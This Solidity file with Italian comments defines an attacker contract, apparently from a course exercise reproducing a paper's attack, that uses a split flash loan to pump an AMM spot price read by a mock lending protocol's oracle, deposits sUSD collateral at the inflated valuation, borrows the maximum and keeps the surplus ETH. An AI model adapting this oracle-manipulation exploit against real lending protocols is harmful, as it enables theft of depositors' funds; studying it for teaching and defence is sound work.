// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IFlashBorrower} from "./IFlashBorrower.sol";
import {FlashLender} from "./FlashLender.sol";
import {SimpleAMM} from "./SimpleAMM.sol";
import {FixedPriceMarket} from "./FixedPriceMarket.sol";
import {VulnerableLending} from "./VulnerableLending.sol";

// Variante dell'attacco come nel paper (18 febbraio): il flash loan viene diviso in due.
// Una parte fa il PUMP sull'AMM letto dall'oracolo, l'altra compra sUSD a PREZZO GIUSTO
// su un mercato che l'oracolo non guarda. Il lending valuta tutto al prezzo gonfiato.
contract AttackerFair is IFlashBorrower {
    FlashLender public immutable flashLender;
    SimpleAMM public immutable amm;
    FixedPriceMarket public immutable market;
    VulnerableLending public immutable lending;
    IERC20 public immutable eth;
    IERC20 public immutable susd;

    uint256 public pumpAmount; // quota del flash loan destinata al pump

    constructor(
        FlashLender _flashLender,
        SimpleAMM _amm,
        FixedPriceMarket _market,
        VulnerableLending _lending,
        IERC20 _eth,
        IERC20 _susd
    ) {
        flashLender = _flashLender;
        amm = _amm;
        market = _market;
        lending = _lending;
        eth = _eth;
        susd = _susd;
    }

    // Avvia l'attacco: `pump` ETH vanno nel pump, `fair` ETH nell'acquisto a prezzo giusto
    function attack(uint256 pump, uint256 fair) external {
        pumpAmount = pump;                  // 1. ricorda come dividere il prestito...
        flashLender.flashLoan(pump + fair); // 2. ...poi chiede il flash loan totale
        // al ritorno, il profitto in ETH e' rimasto su questo contratto
    }

    function executeOperation(uint256 amount) external override {
        // 0. ACCESSO: solo il flash lender puo' chiamarmi (slide 96: "Access control on the Borrower")
        require(msg.sender == address(flashLender), "solo il flash lender");

        uint256 fairAmount = amount - pumpAmount;

        // 1. PUMP: una parte del prestito nell'AMM -> sUSD a prezzo sfavorevole,
        //    ma il prezzo spot letto dall'oracolo schizza in alto
        eth.approve(address(amm), pumpAmount);
        uint256 susdPump = amm.swap(address(eth), pumpAmount);

        // 2. PREZZO GIUSTO: il resto sul mercato fisso, che il pump non tocca
        eth.approve(address(market), fairAmount);
        uint256 susdFair = market.buy(fairAmount);

        // 3. DEPOSIT: deposito TUTTI gli sUSD come collaterale
        uint256 susdTotal = susdPump + susdFair;
        susd.approve(address(lending), susdTotal);
        lending.deposit(susdTotal);

        // 4. BORROW: il lending valuta tutto il collaterale al prezzo GONFIATO
        uint256 borrowable = lending.maxBorrow(address(this));
        lending.borrow(borrowable);

        // 5. REPAY: ripago il flash loan; l'ETH in eccesso resta il mio profitto
        eth.transfer(address(flashLender), amount);
    }

}
